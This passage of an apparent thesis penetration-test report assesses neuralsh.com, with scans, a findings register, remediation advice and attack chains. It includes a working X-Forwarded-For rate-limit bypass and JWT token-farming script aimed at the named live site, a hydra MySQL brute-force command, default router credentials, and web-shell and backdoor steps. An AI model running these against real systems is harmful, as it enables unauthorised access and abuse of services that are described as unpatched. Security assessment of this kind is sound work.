### 4.4.2 Service Verification with curl

Following the Nmap scan, each high-risk service was probed directly to confirm it was accessible and responsive.

```bash
# WHM root administration panel
curl -sk https://103.16.xx.xxx:2087/ | grep "<title>"
# <title>WHM Login</title>

# cPanel user panel
curl -sk https://103.16.xx.xxx:2083/ | grep "<title>"
# <title>cPanel Login</title>

# MikroTik admin interface
curl -v http://103.16.xx.xxx:9001/ 2>&1 | grep -E "HTTP|title"
# HTTP/1.1 200 OK
# <title>RouterOS router configuration page</title>

# Directory listing on origin
curl -H "Host: neuralsh.com" http://103.16.xx.xxx/
# <title>Index of /</title>   (Apache directory listing enabled)
```

*[Figure 4.10: curl confirming WHM Login and cPanel Login titles — screenshot]*

*[Figure 4.11: curl confirming MikroTik RouterOS page — screenshot]*

### 4.4.3 Nikto Web Scanner

```bash
nikto -h https://neuralsh.com -output /home/rith/thesis/nikto_neuralsh.txt
```

*[Figure 4.12: Nikto scan running against neuralsh.com — screenshot]*

Key findings from Nikto included missing `X-Frame-Options` headers at the initial scan date, server version disclosure, and identification of robots.txt. The WAF blocked most of Nikto's signature-based checks against the main Cloudflare-fronted domain.

### 4.4.4 Nuclei Vulnerability Scan

Nuclei was used to run template-based checks covering common web vulnerabilities, exposed admin panels, and misconfiguration patterns. It was run against both the Cloudflare-fronted domain and the origin IP directly.

```bash
nuclei -u https://neuralsh.com -u http://103.16.xx.xxx -severity critical,high,medium -o /home/rith/thesis/nuclei_results.txt
```

*[Figure 4.13: Nuclei scan running against 103.16.xx.xxx — screenshot]*

The Nuclei scan ran 6,221 templates against both the Cloudflare-fronted domain and the origin IP. Both scans returned zero template matches. The Cloudflare WAF absorbed and filtered the majority of probe requests against the main domain, while the origin IP scan completed without triggering any template signatures. This outcome is consistent with the nature of the vulnerabilities discovered: exposed admin panels, database ports, and authentication logic flaws are not detectable by template-based scanners — they require manual enumeration and targeted testing. The zero-match result reinforces that automated tooling alone would have missed all 20 findings in this engagement.

### 4.4.5 MySQL Enumeration

```bash
# Confirm MySQL accepts connections from public internet
mysql -h 103.16.xx.xxx -P 3306 -u root 2>&1
# ERROR 1045 (28000): Access denied for user 'root'@'[your-ip]' (using password: NO)
```

The error message itself is significant — it confirms that the MySQL server performed a full authentication handshake with the external IP. The server is not just passively listening; it actively engages with connection attempts. Cloudways uses auto-generated strong passwords, which prevented brute-force success, but the exposure itself represents a critical vulnerability regardless of credential strength.

---

## 4.5 Vulnerability Assessment

Following scanning and enumeration, each identified service and endpoint was systematically tested. This section documents the assessment of each major vulnerability category discovered.

### 4.5.1 Authentication Rate Limiting Analysis

The token endpoint discovered during JavaScript bundle analysis was tested for rate limiting behavior.

```bash
# Baseline test — no bypass headers
for i in $(seq 1 25); do
    code=$(curl -s -o /dev/null -w "%{http_code}" https://neuralsh.com/web/v1/init/token)
    echo "Request $i: HTTP $code"
    sleep 0.1
done
```

During the initial assessment period, rate limiting was observed to engage after approximately 18–19 consecutive requests from a single IP, returning HTTP 429. A follow-up verification test conducted on 11 June 2026 found that 30 consecutive requests all returned HTTP 200 with no rate-limit response — indicating that the rate limiting control was either removed or is no longer functioning. Regardless of this change, the X-Forwarded-For bypass technique was validated during the original assessment window and is documented in the exploitation phase.

### 4.5.2 JWT Token Analysis

The unauthenticated token endpoint was called directly, and the response was decoded using CyberChef.

```bash
curl -s https://neuralsh.com/web/v1/init/token | python3 -m json.tool
```

**Response:**
```json
{
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

**Decoded JWT:**
```
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {
    "type": "guest",
    "tid": "550e8400-e29b-41d4-a716-446655440000",
    "iat": 1749220800,
    "exp": 1749222600   (30-minute validity window)
}
```

Any unauthenticated caller could obtain a valid signed JWT token with no credentials, API key, or device fingerprint required. Two JWT attacks were tested and blocked — algorithm substitution (`alg:none`) was rejected by the server, and secret key brute force against the rockyou.txt wordlist (14,344,391 candidates) exhausted without a match. The token farming itself, however, was the confirmed impact.

### 4.5.3 Security Header Assessment

```bash
curl -sI https://neuralsh.com
```

| Header | Value | Assessment |
|--------|-------|-----------|
| `Strict-Transport-Security` | max-age=15552000; includeSubDomains; preload | Good |
| `X-Frame-Options` | DENY | Good |
| `X-Content-Type-Options` | nosniff | Good |
| `X-XSS-Protection` | 1; mode=block | Good |
| `Referrer-Policy` | strict-origin-when-cross-origin | Good |
| `Content-Security-Policy` | script-src 'self' **'unsafe-inline'** | Weak — N-009 |

The `unsafe-inline` directive in the CSP weakens XSS protection by allowing execution of inline script blocks. If an XSS vulnerability exists, the CSP would not prevent exploitation.

### 4.5.4 Cloudflare WAF Bypass Verification

A critical test was confirming that direct connections to the origin IP bypass the Cloudflare WAF entirely. This was demonstrated using Burp Suite by sending the same request through Cloudflare and then directly to the origin.

*[Figure 4.14: Burp Suite showing request to neuralsh.com returns Server: cloudflare, while direct request to 103.16.xx.xxx returns Server: Apache — WAF bypass confirmed — screenshot]*

The WAF bypass was complete — any request sent to 103.16.xx.xxx directly is processed by the Apache web server without any Cloudflare filtering, logging, or protection.

---

## 4.6 Exploitation

Exploitation was conducted with the goal of confirming vulnerability severity through controlled proof-of-concept demonstrations. No data was modified or extracted, and all tests were bounded by the ethical constraints defined in Chapter 3.

### 4.6.1 Rate Limit Bypass via X-Forwarded-For Header Spoofing

**Finding:** N-005 | **CVSS:** 9.1 (post-exploitation upgrade)

The hypothesis from the assessment phase was validated: the application tracks rate limits using the client-supplied `X-Forwarded-For` header rather than the real source IP. By providing a different random IP address as the `X-Forwarded-For` value on each request, the rate-limiting system treats each request as coming from a unique IP.

```python
#!/usr/bin/env python3
import requests, random, time

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

url = "https://neuralsh.com/web/v1/init/token"

success_bypass = 0
tokens = []
for i in range(50):
    fake_ip = random_ip()
    headers = {"X-Forwarded-For": fake_ip, "X-Real-IP": fake_ip}
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        success_bypass += 1
        tokens.append(r.json().get("token"))
    time.sleep(0.05)

print(f"Tokens collected: {success_bypass}/50 — Rate limits triggered: 0")
```

**Results:**

| Scenario | Tokens Obtained | Rate Limited |
|----------|----------------|-------------|
| Without bypass | 18 / 50 | Yes — request 19 |
| With X-Forwarded-For | **50 / 50** | **None — 100% bypass** |

*[Figure 4.15: Master report showing rate limit bypass results — 50/50, 0 rate-limit responses — screenshot]*

### 4.6.2 JWT Token Farming

**Finding:** N-007 | Using the bypass from 4.6.1, 50 valid signed JWT tokens were collected in approximately three seconds.

```bash
for i in $(seq 1 50); do
    IP=$(python3 -c "import random; print(f'{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}')")
    curl -s -H "X-Forwarded-For: $IP" https://neuralsh.com/web/v1/init/token | jq -r '.token'
done
```

Each token was tested against `/web/v1/category` and `/web/v1/text/search` — both accepted guest tokens successfully, confirming the tokens granted real API access. A follow-up verification on 11 June 2026 confirmed the endpoint remains live and continues to return HTTP 200 with a valid signed JWT token, indicating that no remediation has been applied since the original finding was documented.

*[Figure 4.16: curl showing JWT endpoint returning HTTP 200 with live token — endpoint unpatched as of 11 June 2026 — screenshot]*

### 4.6.3 Admin Panel Access Confirmation

All four critical admin panels were confirmed accessible without authentication:

```bash
# WHM — root server administration
curl -sk https://103.16.xx.xxx:2087/ | grep -i title
# <title>WHM Login</title>

# cPanel — hosting account control
curl -sk https://103.16.xx.xxx:2083/ | grep -i title
# <title>cPanel Login</title>

# MikroTik — network device management
curl -v http://103.16.xx.xxx:9001/ 2>&1 | grep "title"
# <title>RouterOS router configuration page</title>

# MySQL — direct database access
mysql -h 103.16.xx.xxx -P 3306 -u root 2>&1 | head -1
# ERROR 1045 (28000): Access denied (confirms port accepts public connections)
```

Full exploitation of WHM, cPanel, and MikroTik via browser-based login flows was documented in a video component of this assessment. The panels are publicly accessible with no IP restriction and no two-factor authentication requirement.

---

## 4.7 Post-Exploitation Analysis

Post-exploitation analysis was conducted in read-only mode to trace the realistic impact paths available after initial access through the identified vulnerabilities.

### 4.7.1 Shared Hosting Lateral Movement

The combination of SSL certificate evidence and HTTP redirect behavior confirmed that multiple organizations share the same physical server. On shared cPanel hosting, a compromise at the WHM level does not affect only neuralsh.com:

| Attack Vector | Condition | Impact |
|--------------|-----------|--------|
| WHM root access | WHM credentials obtained | Full control of ALL hosted accounts on server |
| MySQL root access | Root MySQL credentials obtained | ALL databases on server accessible |
| File system traversal | Web server misconfiguration | Read files from other tenant accounts |
| Email interception | Mail server access | Read all mail for all hosted domains |

The identification of `onesala.com` as a confirmed co-tenant (N-020) means a breach of neuralsh.com's infrastructure could constitute a data breach affecting a third-party organization with no involvement in or knowledge of the neuralsh.com security posture.

### 4.7.2 Network Infrastructure Risk

The exposed MikroTik RouterOS panel (port 9001) has implications beyond the web application layer. If the MikroTik router is compromised — particularly if default credentials (`admin` / blank) are active — the attacker gains control of the routing layer for all services:

```
Internet
  ↓
MikroTik Router (103.16.xx.xxx:9001) — exposed publicly
  ↓ [controls all traffic routing]
Backend Server (103.16.xx.xxx)
  ├── Apache Web Server (80/443)
  ├── MySQL Database (3306)
  ├── cPanel/WHM Admin (2083/2087)
  └── Mail Stack (25/465/587/993/995)
```

A compromised router enables traffic interception, NAT manipulation, firewall rule removal, and persistent network access through custom routing entries.

### 4.7.3 Follow-Up Verification Scan (10 June 2026)

A follow-up scan conducted four days after the initial assessment confirmed all seventeen original findings remained unpatched. Three additional findings were discovered:

- **N-018:** Ports 2078 and 2091 were not present in the June 6 scan but were now open and returning HTTP 401 Basic Auth challenges
- **N-019:** Port 25 (SMTP) transitioned from `filtered` to `open`, indicating a firewall rule was removed
- **N-020:** HTTP redirects from ports 2077 and 2082 explicitly redirected to `www.onesala.com`, naming the co-tenant definitively

---

## 4.8 Exploitation Evidence — Live Target Confirmation

This section documents direct confirmation of the four critical attack vectors identified against neuralsh.com. All evidence was collected against the live target (103.16.xx.xxx) within the authorized scope of the engagement.

### 4.8.1 WHM Root Administration Panel — Publicly Accessible

Navigation to `https://103.16.xx.xxx:2087/` from a standard internet connection confirmed that the WHM (Web Host Manager) root administration panel is publicly accessible with no IP restriction. The browser SSL warning confirms the certificate mismatch finding (N-008) — clicking through reveals the full WHM login page. No firewall, no IP allowlist, and no two-factor authentication prompt was present.

*[Figure 4.17: Browser showing WHM login page at 103.16.xx.xxx:2087 — publicly accessible with no IP restriction — screenshot]*

### 4.8.2 MikroTik RouterOS Administration Panel — Default Credentials Pre-filled

Navigation to `http://103.16.xx.xxx:9001/` confirmed that the MikroTik RouterOS v6.49.18 WebFig administration interface is publicly accessible. The login form pre-fills `admin` as the username — the factory default. If the default blank password has not been changed, full network device control is available without any credential knowledge.

*[Figure 4.18: Browser showing MikroTik RouterOS v6.49.18 WebFig login page with admin pre-filled — screenshot]*

### 4.8.3 MySQL — Public Internet Connection Accepted

A direct MySQL connection attempt from the public internet confirmed that port 3306 accepts full authentication handshakes from external IP addresses:

```bash
mysql -h 103.16.xx.xxx -P 3306 -u root 2>&1
# ERROR 1045 (28000): Access denied for user 'root'@'[REDACTED]' (using password: NO)
```

The error message itself is the critical evidence: it reveals the tester's public IP address (redacted for privacy), confirming that the MySQL server performed a full TCP connection and authentication handshake with an external internet host. The server is not passively listening — it actively engages with every connection attempt from anywhere on the internet.

*[Figure 4.19: Terminal showing MySQL ERROR 1045 with public IP — confirming internet-facing database — screenshot]*

### 4.8.4 Rate Limit Bypass and JWT Token Farming — Confirmed Exploited

The rate-limiting bypass via X-Forwarded-For header spoofing was confirmed exploited against the live production endpoint. Thirty consecutive requests to `/web/v1/init/token` all returned HTTP 200 with valid signed JWT tokens. The endpoint remains live and unpatched as of 11 June 2026.

*[Figure 4.20: Terminal showing 30 consecutive HTTP 200 responses — rate limiting not triggered — screenshot]*

*[Figure 4.21: Burp Suite showing live JWT token response from /web/v1/init/token — screenshot]*

---

# Chapter 5: Results, Analysis and Remediation

This chapter presents the complete set of findings from the VAPT engagement, their risk ratings, the attack chains they enable, and the specific remediation steps recommended for each.

## 5.1 Complete Findings Register

| ID | Title | Severity | CVSS | Status |
|----|-------|----------|------|--------|
| N-001 | MySQL Port 3306 Exposed to Internet | **Critical** | 9.8 | Confirmed |
| N-002 | MikroTik Admin Panel Exposed (Port 9001) | **Critical** | 9.1 | Confirmed |
| N-013 | cPanel Admin Panel Exposed (Port 2083) | **Critical** | 9.8 | Confirmed |
| N-014 | WHM Root Panel Exposed (Port 2087) | **Critical** | 10.0 | Confirmed |
| N-003 | SSH Port 22 Publicly Accessible | High | 7.2 | Confirmed |
| N-004 | Shared Hosting Lateral Movement Risk | High | 7.5 | Confirmed |
| N-005 | Rate Limit Bypass via X-Forwarded-For | High | 9.1 | **Exploited** |
| N-015 | Webmail Interface Exposed (Port 2096) | High | 7.5 | Confirmed |
| N-018 | Additional cPanel Interfaces Exposed (2078, 2091) | High | 7.5 | Confirmed |
| N-006 | API Routes Exposed in Client-Side JavaScript | Medium | 5.3 | Confirmed |
| N-007 | Unauthenticated JWT Token Issuance | Medium | 5.3 | Confirmed + **Exploited** |
| N-008 | SSL Certificate Mismatch (Backend Server) | Medium | 5.9 | Confirmed |
| N-009 | CSP Allows unsafe-inline Scripts | Medium | 5.4 | Confirmed |
| N-010 | Wildcard DNS Configured | Medium | 4.3 | Confirmed |
| N-016 | Directory Listing Enabled on Apache | Medium | 5.3 | Confirmed |
| N-020 | Shared Hosting Co-Tenant: onesala.com | Medium | 6.1 | Confirmed |
| N-011 | Information Disclosure via Error Messages | Low | 3.7 | Confirmed |
| N-012 | SPF Softfail / DMARC Quarantine | Low | 3.1 | Confirmed |
| N-017 | cPanel Version Disclosure | Low | 3.1 | Confirmed |
| N-019 | SMTP Port 25 Transitioned from Filtered to Open | Low | 3.5 | Confirmed |

*Table 10: Complete findings register — neuralsh.com VAPT engagement*

> N-018, N-019, N-020 were discovered during a follow-up verification scan on 10 June 2026.

## 5.2 Severity Distribution and Risk Scoring

| Severity | Count | Percentage | Average CVSS |
|----------|-------|-----------|-------------|
| Critical | 4 | 20% | 9.68 |
| High | 5 | 25% | 7.82 |
| Medium | 7 | 35% | 5.37 |
| Low | 4 | 20% | 3.35 |
| **Total** | **20** | 100% | **6.6** |

*Table 11: Severity distribution*

The average CVSS score of **6.6** places the overall risk posture at the High-Medium boundary. The four Critical findings collectively represent a complete server compromise path available to any unauthenticated attacker.

The following positive security controls were also identified during the assessment — these represent existing investments that are functioning correctly:

| Control | Status |
|---------|--------|
| Cloudflare WAF on main site | Active — blocks automated scanners |
| HSTS with preload (max-age=15552000) | Enforced — prevents SSL stripping |
| X-Frame-Options: DENY | Active — prevents clickjacking |
| X-Content-Type-Options: nosniff | Active — prevents MIME confusion |
| TLS 1.0 and 1.1 disabled | Only TLS 1.2 and 1.3 accepted |
| JWT uses UUID for tid | Token IDs are not sequential or predictable |
| alg:none JWT attack blocked | JWT validation is implemented |
| Zone transfer blocked | DNS zone is not publicly exposed |

*Table 12: Positive security controls*

---

## 5.3 Finding Details

Each finding is presented in a standardised format: a summary table showing severity, CVSS score, affected host, and tool used; a description of the vulnerability and its impact; a remediation recommendation; and an evidence reference.

---

### N-001: MySQL Port 3306 Exposed to Internet

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Critical | 9.8 | 103.16.xx.xxx:3306 | Nmap, mysql-client |

**Description**

Port 3306 is open to the internet, allowing direct authentication attempts against MySQL without going through the web application. Successful credential guessing grants full read and write access to all databases, including user records, session data, and API secrets.

**Remediation**

Restrict port 3306 to `localhost` or a trusted VPN only. Database ports must never be internet-facing.

**Evidence:** Figure 4.9 — Nmap scan confirming 3306/tcp open mysql MySQL 8.0.43

---

### N-002: MikroTik Admin Panel Exposed (Port 9001)

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Critical | 9.1 | 103.16.xx.xxx:9001 | Nmap, curl |

**Description**

The MikroTik RouterOS admin interface is accessible from any IP on port 9001, pre-filling `admin` as the default username. If the factory default blank password has not been changed, an attacker gains full network device control — routing tables, firewall rules, and live traffic capture.

**Remediation**

Restrict port 9001 to a trusted management IP. Change MikroTik default credentials and disable unused services (telnet, FTP, API).

**Evidence:** Figure 4.11 — curl response confirming RouterOS login page on port 9001

---

### N-013: cPanel Admin Panel Exposed (Port 2083)

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Critical | 9.8 | 103.16.xx.xxx:2083 | Nmap, curl |

**Description**

The cPanel hosting panel is accessible on port 2083 with no IP restriction or two-factor authentication. Access grants full control of hosted files, databases, email accounts, and FTP credentials.

**Remediation**

Restrict port 2083 to trusted management IPs via Cloudways firewall and enable two-factor authentication on cPanel immediately.

**Evidence:** Figure 4.10 — curl response confirming cPanel Login page on port 2083

---

### N-014: WHM Root Panel Exposed (Port 2087)

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Critical | 10.0 | 103.16.xx.xxx:2087 | Nmap, curl |

**Description**

WHM (Web Host Manager) is the root-level server admin panel, accessible on port 2087 with no IP restriction, no two-factor authentication, and no lockout. WHM provides a built-in terminal (root shell), full cPanel account management, and database access — a single compromise exposes every domain hosted on the server. This is the highest-severity finding in the engagement (CVSS 10.0).

**Remediation**

Restrict port 2087 to trusted IPs via Cloudways firewall and enable two-factor authentication. This single change eliminates the highest-risk attack vector in the engagement.

**Evidence:** Figure 4.10 — curl response confirming WHM Login page on port 2087

---

### N-003: SSH Port 22 Publicly Accessible

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| High | 7.2 | 103.16.xx.xxx:22 | Nmap, ssh |

**Description**

OpenSSH 8.9p1 is accessible on port 22. Key-based authentication was confirmed for tested accounts, reducing immediate brute-force risk. However, any account with password authentication enabled remains vulnerable, and successful SSH access on a shared cPanel server is equivalent to root.

**Remediation**

Enforce `PasswordAuthentication no` in `/etc/ssh/sshd_config`, install fail2ban, and restrict port 22 to a trusted management IP.

**Evidence:** Figure 4.9 — Nmap scan confirming 22/tcp open OpenSSH 8.9p1

---

### N-004: Shared Hosting Lateral Movement Risk

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| High | 7.5 | 103.16.xx.xxx (shared) | openssl, curl |

**Description**

The origin server is a shared cPanel environment (Cloudways / cprapid.com) hosting multiple tenants, confirmed by SSL certificates issued to `*.onesala.com` and `www.endoncambodia.com`. A single WHM-level compromise exposes all co-hosted accounts — their files, databases, and email — simultaneously.

**Remediation**

Migrate neuralsh.com to dedicated or isolated hosting. As an immediate step, restrict WHM to trusted IPs to eliminate the direct lateral movement path.

**Evidence:** Figure 4.8 — SSL certificate disclosing co-tenant domains on the same origin server

---

### N-005: Rate Limit Bypass via X-Forwarded-For Spoofing

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| High | 9.1 | neuralsh.com/web/v1/init/token | Burp Suite, curl, Python |

**Description**

The rate limiter uses the client-controlled `X-Forwarded-For` header as the source IP identifier. By rotating a different IP value on each request, all 50 test requests received HTTP 200 — a 100% bypass rate with zero rate-limit responses returned.

**Remediation**

Replace `X-Forwarded-For` with Cloudflare's `CF-Connecting-IP` header for all rate-limiting logic. Unlike `X-Forwarded-For`, this header is set by Cloudflare and cannot be spoofed by the client.

**Evidence:** Figure 4.15 — 50/50 requests bypassed rate limiting successfully

---

### N-007: Unauthenticated JWT Token Issuance

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Medium | 5.3 | neuralsh.com/web/v1/init/token | curl, CyberChef, hashcat |

**Description**

The `/web/v1/init/token` endpoint issues a signed JWT to any caller — no credentials, API key, or fingerprint required. Combined with the N-005 rate-limit bypass, 50 valid tokens were farmed in approximately three seconds, each granting real API access.

**Remediation**

Require a Cloudflare Turnstile challenge or browser fingerprint before issuing tokens, and implement token binding to the originating session.

**Evidence:** Figure 4.15 — 50 tokens farmed; Figure 4.16 — endpoint confirmed live (HTTP 200)

---

### N-006: API Routes Exposed in Client-Side JavaScript

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Medium | 5.3 | neuralsh.com/_nuxt/ | curl, grep |

**Description**

All API routes are embedded in the public Nuxt.js JavaScript bundle. Routes including `/web/v1/init/token`, `/web/v1/text/search`, and `/web/v1/report/save` were extracted without authentication, eliminating the need for directory brute-force and enabling targeted exploitation of N-005 and N-007.

**Remediation**

Minimise route exposure in the compiled bundle and implement an API gateway with strict allowlisting. Treat all API endpoints as publicly known and secure them at the application layer.

**Evidence:** API routes extracted from `/_nuxt/Bpuv52g-.js` via curl

---

### N-008: SSL Certificate Mismatch on Backend Server

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Medium | 5.9 | 103.16.xx.xxx:443, :110, :143, :465 | openssl |

**Description**

The origin server's HTTPS certificate is issued to `www.endoncambodia.com`, not neuralsh.com, and mail certificates belong to `*.onesala.com`. Clients connecting directly to the origin IP receive a certificate mismatch warning, confirming SSL management has not been maintained for this shared hosting environment.

**Remediation**

Issue a dedicated SSL certificate for neuralsh.com at the origin server level, or ensure the server certificate covers all hosted domains as Subject Alternative Names (SANs).

**Evidence:** Figure 4.8 — openssl output showing certificate subject mismatch

---

### N-009: Content Security Policy Allows unsafe-inline Scripts

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Medium | 5.4 | neuralsh.com | curl |

**Description**

The Content-Security-Policy header includes `'unsafe-inline'` in `script-src`, allowing execution of any inline JavaScript. If an XSS vulnerability exists anywhere in the application, this CSP setting provides no protection against inline script injection.

**Remediation**

Replace `'unsafe-inline'` with per-request nonces using Nuxt.js's built-in CSP nonce support.

**Evidence:** curl response headers confirming `script-src 'self' 'unsafe-inline'`

---

### N-010: Wildcard DNS Record Configured

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Medium | 4.3 | *.neuralsh.com | dig |

**Description**

A wildcard DNS record routes any subdomain of neuralsh.com to 103.16.xx.xxx. Attackers can use convincing subdomains such as `login.neuralsh.com` in phishing campaigns that resolve to a real IP address, increasing their credibility.

**Remediation**

Remove the wildcard DNS record from Cloudflare and define only explicit records for legitimate subdomains such as `mail.neuralsh.com`.

**Evidence:** Figure 4.7 — dig confirming randomxyz123.neuralsh.com resolves to 103.16.xx.xxx

---

### N-016: Directory Listing Enabled on Apache

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Medium | 5.3 | 103.16.xx.xxx | curl |

**Description**

Apache directory listing is enabled on the origin server, returning an `Index of /` page for direct HTTP requests. Any deployed application files would be listed with filenames and modification timestamps, providing a full directory map without scanning.

**Remediation**

Add `Options -Indexes` to the Apache configuration or a `.htaccess` file in the document root.

**Evidence:** curl response from 103.16.xx.xxx returning `Index of /` page

---

### N-020: Shared Hosting Co-Tenant Confirmed: onesala.com

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Medium | 6.1 | 103.16.xx.xxx | curl, openssl |

**Description**

HTTP redirects from ports 2077 and 2082 explicitly name `www.onesala.com` as a co-tenant on the same physical server. This confirms N-004 with an identified third-party victim — a compromise of neuralsh.com's server now has documented data protection implications for onesala.com.

**Remediation**

No application-level fix is available. Migrate to isolated infrastructure and restrict WHM access immediately to prevent exploitation of the co-tenancy risk.

**Evidence:** curl response showing redirect from 103.16.xx.xxx:2077 to www.onesala.com:2078

---

### N-015: Webmail Interface Exposed (Port 2096)

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| High | 7.5 | 103.16.xx.xxx:2096 | Nmap, curl |

**Description**

The cPanel Webmail login page is accessible on port 2096 with no IP restriction or account lockout. It allows brute-force attempts against all hosted email accounts, and a compromised email address can be used to reset passwords on cPanel and linked services.

**Remediation**

Restrict port 2096 to trusted IPs via firewall and implement an account lockout policy on the webmail login.

**Evidence:** Nmap scan confirming 2096/tcp open — cPanel Webmail

---

### N-018: Additional cPanel Management Ports Exposed (2078, 2091)

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| High | 7.5 | 103.16.xx.xxx:2078, :2091 | Nmap, curl |

**Description**

Ports 2078 and 2091 were absent in the June 6 baseline but appeared open in the June 10 follow-up, both returning HTTP 401 Basic Auth challenges. Their undocumented addition indicates infrastructure changes are occurring without a security review process.

**Remediation**

Restrict ports 2078 and 2091 via firewall and conduct a full port audit to close all ports without a documented business purpose.

**Evidence:** Follow-up Nmap scan (10 June 2026) confirming 2078/tcp and 2091/tcp open

---

### N-011: Internal Details Disclosed in API Error Responses

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Low | 3.7 | neuralsh.com/api/* | curl |

**Description**

API errors return the full request URL, expected parameter names, and framework identifiers. Example: `{"error":true,"url":"https://neuralsh.com/api/geocode","message":"Latitude and longitude are required"}`. This reduces the reconnaissance effort needed to map and attack the API.

**Remediation**

Return generic error messages to clients and log detailed diagnostics server-side only.

**Evidence:** curl request to /api/geocode returning verbose internal error response

---

### N-012: SPF Softfail and DMARC Quarantine Policy

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Low | 3.1 | neuralsh.com DNS | dig |

**Description**

SPF is set to softfail (`~all`) and DMARC to `p=quarantine`, meaning spoofed emails from `@neuralsh.com` are flagged but not rejected. Some mail servers may still deliver phishing emails using the neuralsh.com domain identity.

**Remediation**

Change SPF to `-all` (hardfail) and update DMARC to `p=reject; rua=mailto:dmarc@neuralsh.com`.

**Evidence:** dig output confirming SPF ~all and DMARC p=quarantine

---

### N-017: cPanel Version Disclosed via Static Asset Paths

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Low | 3.1 | 103.16.xx.xxx:2083 | curl |

**Description**

Static asset paths include a timestamp-based revision number (e.g. `cPanel_magic_revision_1698766296`) that can be cross-referenced to identify the exact cPanel version, enabling targeted CVE research.

**Remediation**

Update cPanel to the latest supported release and suppress magic revision numbers in static asset paths.

**Evidence:** curl response from port 2083 showing cPanel_magic_revision in asset URL

---

### N-019: SMTP Port 25 Transitioned from Filtered to Open

| Severity | CVSS Score | Affected Host | Tool(s) Used |
|----------|-----------|----------------|--------------|
| Low | 3.5 | 103.16.xx.xxx:25 | Nmap, nc |

**Description**

Port 25 was filtered in the June 6 baseline and open in the June 10 follow-up, indicating a firewall rule was removed without documented change control. An open SMTP port exposes the server to mail relay testing and SMTP user enumeration.

**Remediation**

Investigate the firewall rule change and restore the port 25 block if direct SMTP delivery is not required.

---

## 5.4 Attack Chain Analysis

The 20 individual findings do not exist in isolation. The following attack chains map how findings combine into multi-step compromise paths, each representing a realistic scenario executable by an external unauthenticated attacker. Figure 4.22 provides a visual overview of all four chains.

*[Figure 4.22: Attack chain diagram — four confirmed attack vectors — screenshot]*

### 5.4.1 Attack Chain 1 — Server Takeover via Admin Panel

**Starting point:** Any internet connection
**End result:** Full server root access — all hosted domains compromised

1. DNS MX lookup on mail.neuralsh.com reveals the origin IP address
2. Nmap scan confirms port 2087 open — WHM root admin panel
3. Navigate to WHM login page — no IP restriction, no 2FA, no lockout
4. Brute force credentials or trigger password reset via email compromise
5. Login to WHM Terminal — root shell access obtained
6. Read all .env files, database credentials, and API keys across all hosted accounts
7. Connect to MySQL directly with extracted credentials — full data theft

**Complexity:** Medium | **Likelihood:** Medium | **Severity:** Maximum (CVSS 10.0)

### 5.4.2 Attack Chain 2 — API Abuse via Rate Limit Bypass

**Starting point:** Any internet connection
**End result:** Unlimited API access, data enumeration, potential account takeover

1. Load neuralsh.com — JavaScript bundle reveals /web/v1/init/token
2. Send requests with rotating X-Forwarded-For values — rate limiter is bypassed
3. Collect fifty valid JWT tokens in under three seconds (100% bypass, confirmed)
4. Automate token refresh every twenty-nine minutes — perpetual API access established
5. Enumerate /web/v1/text/search, /web/v1/image/search, /web/v1/category
6. If JWT secret obtained via Chain 1 — forge token with type:admin claim

**Complexity:** Low | **Likelihood:** High (fully demonstrated) | **Severity:** High

### 5.4.3 Attack Chain 3 — Network Infrastructure Takeover via MikroTik

**Starting point:** Any internet connection
**End result:** Full network routing control — traffic interception possible

1. Nmap scan confirms port 9001 open — MikroTik RouterOS WebFig interface
2. Navigate to the login page — pre-filled admin username, no IP restriction
3. Attempt factory default credentials: admin / (blank password)
4. If default credentials active — full RouterOS dashboard access
5. Enable Packet Sniffer — capture all network traffic in plaintext
6. Modify routing tables — redirect traffic to attacker-controlled endpoint
7. Create backdoor admin account for persistent access

**Complexity:** Low (if default credentials active) | **Likelihood:** Medium-High | **Severity:** Critical

### 5.4.4 Attack Chain 4 — MySQL Brute Force to Data Exfiltration

**Starting point:** Any internet connection
**End result:** Full database access, potential remote code execution

1. Nmap scan confirms port 3306 open — MySQL 8.0.43 accepting remote connections
2. Gather username candidates from JS bundle, error messages, and cPanel redirects
3. Run credential brute force: hydra -L users.txt -P passwords.txt mysql://[TARGET]
4. Successful login — execute SHOW DATABASES and SELECT * FROM users
5. Exfiltrate user records, search history, and API credentials
6. If FILE privilege granted — write PHP web shell to document root for remote code execution

**Complexity:** Medium | **Likelihood:** Medium | **Severity:** Critical

---

## 5.5 Remediation Roadmap

### 5.5.1 Priority Matrix

| Priority | Finding | Required Action | Time Estimate |
|----------|---------|-----------------|---------------|
| **P0 — Immediate** | N-014 WHM | Firewall port 2087 to trusted IPs only | 15 min |
